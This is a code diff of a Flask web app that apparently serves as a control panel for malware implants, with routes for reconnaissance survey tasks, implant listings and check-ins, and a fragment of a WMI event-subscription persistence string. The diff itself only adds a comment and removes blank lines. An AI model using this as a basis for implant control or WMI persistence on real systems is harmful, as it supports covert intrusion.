@@ -30,6 +30,8 @@ def surveyGen():
 #       key='0000'                      #We will get the key later
         notes=request.form['notes']
         mp_pref, ssl, systeminfo, netstat, ps, svc, dir, dir_c, dir_windows, dir_system32, dir_programfiles, dir_x86, netsh, firewall, firewall_rules = (False,)*15
+        
+        #These are redundent and I should optomize this part better.  Why IF here and then IF again later.  Unneeded
         if "ssl" in request.form:
             ssl=True
         if "systeminfo" in request.form:
@@ -114,7 +116,6 @@ def surveyGen():
         return redirect(url_for('tasks')) 
     return render_template('surveyGen.html',error=error)
 
-
 @app.route('/showCompleted',methods=['GET','POST'])
 def showCompleted():
     error = None
@@ -194,11 +195,6 @@ def deleteImplant():
             flash("Implant not deleted.")
             return redirect(url_for('implants'))
 
-
-
-
-
-
 @app.route('/tasks',methods=['GET','POST'])
 def tasks():
     error = None
@@ -236,7 +232,7 @@ def implants():
         return render_template('singleimplant.html',implantDetails=implantDetails,singleImplant=singleImplant,error=error)
 
     cur = mysql.connection.cursor()
-#    implants = cur.execute("select t.UUID, t.last_checkin, t.gateway,t.id from checkins as t Inner join ( select UUID, max(last_checkin) as MaxDate from checkins group by UUID ) tm on t.UUID = tm.UUID and t.last_checkin = tm.MaxDate;")    ##this will grab implants, latest gateway, and latest checking.  I dno't think I want this, but i'm leaving it in case
+#    implants = cur.execute("select t.UUID, t.last_checkin, t.gateway,t.id from checkins as t Inner join ( select UUID, max(last_checkin) as MaxDate from checkins group by UUID ) tm on t.UUID = tm.UUID and t.last_checkin = tm.MaxDate;")    ##this will grab implants, latest gateway, and latest checking  I dno't think I want this, but i'm leaving it in case
     implants = cur.execute("select * from implants")
     implantDetails = cur.fetchall()
     return render_template('implants.html',implantDetails=implantDetails,error=error)
@@ -352,7 +348,6 @@ $x='\\\.\\root\subscription:__FilterToConsumerBinding.Consumer="\\\\\\\\.\\\\roo
             return render_template('generateinstall.html',error=error,data=data,remove_data=remove_data)
 
     return render_template('generateinstall.html',error=error)
-
 
 if __name__ == "__main__":
     app.run(host='0.0.0.0',port=5000,debug=True)
